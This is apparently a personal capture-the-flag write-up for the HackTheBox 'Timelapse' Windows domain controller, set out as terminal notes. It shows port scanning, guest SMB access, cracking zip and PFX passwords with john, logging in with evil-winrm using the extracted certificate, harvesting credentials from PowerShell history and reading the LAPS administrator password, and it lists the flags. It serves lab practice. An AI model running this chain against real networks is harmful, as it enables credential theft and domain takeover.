Timelapse IP:



rustscan:
Open 10.10.11.152:53
Open 10.10.11.152:88
Open 10.10.11.152:135
Open 10.10.11.152:139
Open 10.10.11.152:389
Open 10.10.11.152:445
Open 10.10.11.152:464
Open 10.10.11.152:593
Open 10.10.11.152:636
Open 10.10.11.152:5986
Open 10.10.11.152:9389
Open 10.10.11.152:49667
Open 10.10.11.152:49674
Open 10.10.11.152:49673
Open 10.10.11.152:49692
Open 10.10.11.152:49700



nmap:

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-01-31 22:27:04Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
5986/tcp  open  ssl/http      syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233 a199 4504 0859 013f b9c5 e4f6 91c3
| SHA-1: 5861 acf7 76b8 703f d01e e25d fc7c 9952 a447 7652
| -----BEGIN CERTIFICATE-----
| MIIDCjCCAfKgAwIBAgIQLRY/feXALoZCPZtUeyiC4DANBgkqhkiG9w0BAQsFADAd
| MRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwHhcNMjExMDI1MTQwNTI5WhcN
| MjIxMDI1MTQyNTI5WjAdMRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDJdoIQMYt47skzf17SI7M8jubO
| rD6sHg8yZw0YXKumOd5zofcSBPHfC1d/jtcHjGSsc5dQQ66qnlwdlOvifNW/KcaX
| LqNmzjhwL49UGUw0MAMPAyi1hcYP6LG0dkU84zNuoNMprMpzya3+aU1u7YpQ6Dui
| AzNKPa+6zJzPSMkg/TlUuSN4LjnSgIV6xKBc1qhVYDEyTUsHZUgkIYtN0+zvwpU5
| isiwyp9M4RYZbxe0xecW39hfTvec++94VYkH4uO+ITtpmZ5OVvWOCpqagznTSXTg
| FFuSYQTSjqYDwxPXHTK+/GAlq3uUWQYGdNeVMEZt+8EIEmyL4i4ToPkqjPF1AgMB
| AAGjRjBEMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAdBgNV
| HQ4EFgQUZ6PTTN1pEmDFD6YXfQ1tfTnXde0wDQYJKoZIhvcNAQELBQADggEBAL2Y
| /57FBUBLqUKZKp+P0vtbUAD0+J7bg4m/1tAHcN6Cf89KwRSkRLdq++RWaQk9CKIU
| 4g3M3stTWCnMf1CgXax+WeuTpzGmITLeVA6L8I2FaIgNdFVQGIG1nAn1UpYueR/H
| NTIVjMPA93XR1JLsW601WV6eUI/q7t6e52sAADECjsnG1p37NjNbmTwHabrUVjBK
| 6Luol+v2QtqP6nY4DRH+XSk6xDaxjfwd5qN7DvSpdoz09+2ffrFuQkxxs6Pp8bQE
| 5GJ+aSfE+xua2vpYyyGxO0Or1J2YA1CXMijise2tp+m9JBQ1wJ2suUS2wGv1Tvyh
| lrrndm32+d0YeP/wb8E=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-01-31T22:28:34+00:00; +8h00m01s from scanner time.
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack Microsoft Windows RPC
49700/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20948/tcp): CLEAN (Timeout)
|   Check 2 (port 32357/tcp): CLEAN (Timeout)
|   Check 3 (port 56762/udp): CLEAN (Timeout)
|   Check 4 (port 22941/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-01-31T22:27:55
|_  start_date: N/A




smbmap -H 10.10.11.152            
[+] IP: 10.10.11.152:445        Name: dc01.timelapse.htb                                
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Timelapse]
└─$ smbmap -H 10.10.11.152 -u null -p null
[+] Guest session       IP: 10.10.11.152:445    Name: dc01.timelapse.htb                                
[!] Error:  (<class 'impacket.smbconnection.SessionError'>, 'smbmap', 1337)
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Timelapse]
└─$ smbmap -H 10.10.11.152 -u guest       
[+] IP: 10.10.11.152:445        Name: dc01.timelapse.htb                                
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 

        smbclient -N //10.10.11.152/Shares                                                                                                                                                           1 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 1276755 blocks available



to into Dev and HelpDesk files and download evetything

try to unzip pe winrm zip , but is password protected. using zip2john to get the hash of the pass and then john to crack the hash

zip2john winrm_backup.zip > hash                                                                                                                                                            82 ⨯
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Timelapse]
└─$ ls
hash  LAPS_Datasheet.docx  LAPS_OperationsGuide.docx  LAPS_TechnicalSpecification.docx  LAPS.x64.msi  winrm_backup.zip
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Timelapse]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash    
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2023-01-31 09:37) 4.000g/s 13893Kp/s 13893Kc/s 13893KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

unziping the winrm file, gives us another file that is password protected. Tried using the password from the zip file but it didint work.

legacyy_dev_auth.pfx is a pfx file,it seems that we can use pfx2john to generate a hash

Success, it works!!!

fx2john legacyy_dev_auth.pfx > pfx_hash
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Timelapse]
└─$ ls
hash  LAPS_Datasheet.docx  LAPS_OperationsGuide.docx  LAPS_TechnicalSpecification.docx  LAPS.x64.msi  legacyy_dev_auth.pfx  pfx_hash  winrm_backup.zip
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Timelapse]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pfx_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:29 DONE (2023-01-31 09:41) 0.03362g/s 108666p/s 108666c/s 108666C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                

now that we have the passwd, let's see the contents of the file

It contains a certificate and a key. Let's get the certificate and key out of there;

openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacy_dev_auth.key-enc
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Timelapse]
└─$ openssl rsa -in legacy_dev_auth.key-enc -out legacy_dev_auth.key             
Enter pass phrase for legacy_dev_auth.key-enc:
writing RSA key
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Timelapse]
└─$ ls                                                                           
cert.pem  key.pem              LAPS_OperationsGuide.docx         LAPS.x64.msi         legacy_dev_auth.key-enc  pfx_hash    winrm_backup.zip
hash      LAPS_Datasheet.docx  LAPS_TechnicalSpecification.docx  legacy_dev_auth.key  legacyy_dev_auth.pfx     server.key
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokey -out legacy_dev_auth.crt
pkcs12: Unrecognized flag nokey
pkcs12: Use -help for summary.
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacy_dev_auth.crt                                                                                                            1 ⨯
Enter Import Password:
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Timelapse]
└─$ ls legacy_dev_auth.*
legacy_dev_auth.crt  legacy_dev_auth.key  legacy_dev_auth.key-enc

we can now use evil-winrm to log in
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Timelapse]
└─$ evil-winrm -i 10.10.11.152 -S -k legacy_dev_auth.key -c legacy_dev_auth.crt 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\legacyy\Documents> 


User.txt: 50e957b2ed7aae3acded250219604140

PRIVESC:

*Evil-WinRM* PS C:\Users\legacyy\Desktop> net user legacyy
User name                    legacyy
Full Name                    Legacyy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/23/2021 11:17:10 AM
Password expires             Never
Password changeable          10/24/2021 11:17:10 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/31/2023 2:55:39 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Development
The command completed successfully.


*Evil-WinRM* PS C:\Users\legacyy\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\legacyy\Desktop> 


There is an interesting powershell history file located in legacyy/AppData/Roaming/Microsoft/Windows/PowerShell/PsReadLine

*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit


from here, we have new credentials svc_deploy / E3R$Q62^12p7PLlC%KWaxuaV

lets use this creds to log in using evil-winrm

evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 

no new privileges :(


*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 11:12:37 AM
Password expires             Never
Password changeable          10/26/2021 11:12:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 11:25:53 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.



LAPS_Readers seems to imply svc_deploy has access to read from LAPS.

LAPS
Background
With LAPS, the DC manages the local administrator passwords for computers on the domain. It is common to create a group of users and give them permissions to read these passwords, allowing the trusted administrators access to all the local admin passwords.

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> get-ADComputer DC01 -property 'ms-mcs-admpwd'


DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : gKZ[36ithaPoiFilFk2wz+41
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :



*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 


administrator's password is : gKZ[36ithaPoiFilFk2wz+41


use ewil-winrm to log in as administrator:

evil-winrm -i 10.10.11.152 -u administrator -p 'gKZ[36ithaPoiFilFk2wz+41' -S

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 

ROOT Flag: f23b13f700c9753bb4ce838b5975835b

